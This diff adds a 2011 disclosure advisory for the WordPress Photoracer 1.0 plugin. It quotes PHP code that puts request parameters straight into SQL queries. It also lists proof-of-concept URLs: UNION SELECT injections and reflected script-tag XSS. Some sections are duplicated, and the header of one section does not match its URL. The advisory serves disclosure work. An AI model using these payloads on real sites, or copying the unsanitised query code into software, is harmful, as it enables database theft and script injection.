@@ -1,0 +1,100 @@
+##########################################################################
+## WordPress Photoracer Plugin <= 1.0 Multiple XSS & SQLI Vulnerabilities
+## Tested on Wordpress 3.2 Hebrew, Photoracer 1.0
+## Vulnerabilities:
+## * XSS
+## * SQL Injection
+## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com>
+## Date: 26/08/2011
+## Software Link: http://wordpress.org/extend/plugins/photoracer/
+## ISRAEL
+##########################################################################
+##			Author will be not responsible for any damage.
+##########################################################################
+
+## Vulnerable Code - mostvoted.php [15-22]:
+15.if (isset($_REQUEST['pid']) || isset($_REQUEST['prid']))
+16.		$postid = $_REQUEST['pid'] ? $_REQUEST['pid'] : $_REQUEST['prid'];
+17.if (isset($_REQUEST['p']))
+18.		$p = $_REQUEST['p'];
+19.if ($postid == 0) exit;
+20.$q1 = "SELECT raceid, active_from, active_to, indexpath, name, headcontent, numphoto FROM ".
+21.		$wpdb->prefix."photoracer_admin where postid=$postid";
+22.$out = $wpdb->get_row($q1);
+
+## NOTE:
+## As you can see there is no validation or any filter to variable $postid ($_REQUEST['pid'] and $_REQUEST['prid']).
+## See line 16. so you can inject sql query by using $postid;
+## SQL Injection PoC:
+http://www.example.com/wp-content/plugins/photoracer/mostvoted.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7 
+http://www.example.com/wp-content/plugins/photoracer/mostvoted.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+####################################################################################################################################################
+
+## Vulnerable Code - mostviewed.php [15-22]:
+15.if (isset($_REQUEST['pid']) || isset($_REQUEST['prid']))
+16.		$postid = $_REQUEST['pid'] ? $_REQUEST['pid'] : $_REQUEST['prid'];
+17.if (isset($_REQUEST['p']))
+18.		$p = $_REQUEST['p'];
+19.if ($postid == 0) exit;
+20.$q1 = "SELECT raceid, active_from, active_to, indexpath, name, headcontent, numphoto FROM ".
+21.		$wpdb->prefix."photoracer_admin where postid=$postid";
+22.$out = $wpdb->get_row($q1);
+
+## NOTE:
+## As you can see there is no validation or any filter to variable $postid ($_REQUEST['pid'] and $_REQUEST['prid']).
+## See line 16. so you can inject sql query by using $postid;
+## SQL Injection PoC:
+http://www.example.com/wp-content/plugins/photoracer/mostviewed.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/mostviewed.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+####################################################################################################################################################
+
+## Vulnerable Code - crono.php [15-22]:
+15.if (isset($_REQUEST['pid']) || isset($_REQUEST['prid']))
+16.		$postid = $_REQUEST['pid'] ? $_REQUEST['pid'] : $_REQUEST['prid'];
+17.if (isset($_REQUEST['p']))
+18.		$p = $_REQUEST['p'];
+19.if ($postid == 0) exit;
+20.$q1 = "SELECT raceid, active_from, active_to, indexpath, name, headcontent, numphoto FROM ".
+21.		$wpdb->prefix."photoracer_admin where postid=$postid";
+22.$out = $wpdb->get_row($q1);
+
+## NOTE:
+## As you can see there is no validation or any filter to variable $postid ($_REQUEST['pid'] and $_REQUEST['prid']).
+## See line 16. so you can inject sql query by using $postid;
+## SQL Injection PoC:
+http://www.example.com/wp-content/plugins/photoracer/crono.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+http://www.example.com/wp-content/plugins/photoracer/crono.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+####################################################################################################################################################
+
+## Vulnerable Code - changefrom.php [31, 47-49]:
+31.if (isset($_REQUEST['rid'])) $rid = $_REQUEST['rid']; 
+...........
+47.$prq="SELECT raceid, postid, active_from, active_to, indexpath, name, numphoto FROM ".$wpdb->prefix."photoracer_admin WHERE raceid=$rid";
+48.//echo $pr_qlist."<br>\n";
+49.$out = $wpdb->get_row($prq);
+
+## NOTE:
+## As you can see there is no validation or any filter to variable $rid ($_REQUEST['rid']).
+## See line 31. so you can inject sql query by using $postid;
+## SQL Injection PoC:
+http://www.example.com/wp-content/plugins/photoracer/changefrom.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+####################################################################################################################################################
+
+## Vulnerable Code - changefrom.php [31, 47-49]:
+31.if (isset($_REQUEST['rid'])) $rid = $_REQUEST['rid']; 
+...........
+47.$prq="SELECT raceid, postid, active_from, active_to, indexpath, name, numphoto FROM ".$wpdb->prefix."photoracer_admin WHERE raceid=$rid";
+48.//echo $pr_qlist."<br>\n";
+49.$out = $wpdb->get_row($prq);
+
+## NOTE:
+## As you can see there is no validation or any filter to variable $rid ($_REQUEST['rid']).
+## See line 31. so you can inject sql query by using $postid;
+## SQL Injection PoC:
+http://www.example.com/wp-content/plugins/photoracer/changeto.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+####################################################################################################################################################
+
+
+## XSS PoC:
+http://www.example.com/wp-content/plugins/photoracer/changefrom.php?rid="><script>alert(1);</script>
+http://www.example.com/wp-content/plugins/photoracer/changeto.php?rid="><script>alert(1);</script>
